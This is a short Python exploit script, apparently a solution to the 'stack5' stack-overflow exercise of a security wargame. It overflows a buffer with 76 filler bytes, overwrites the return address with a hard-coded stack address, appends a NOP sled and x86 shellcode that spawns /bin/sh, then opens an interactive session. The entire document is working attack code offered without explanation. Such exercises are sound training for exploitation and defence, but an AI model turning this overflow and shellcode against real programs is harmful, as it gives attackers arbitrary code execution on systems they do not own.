from zio import *
target  = './stack5'
c_read  = COLORED(RAW, 'blue')
c_write = COLORED(RAW, 'green')
io      = zio(target, print_read = c_read, print_write = c_write)
io.gdb_hint([0x80483da])

shellcode = (
    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
)

payload = 'A' * 76
payload += l32(0xbffff7d6)
payload += '\x90' * 16    
payload += shellcode

io.writeline(payload)
io.interact()
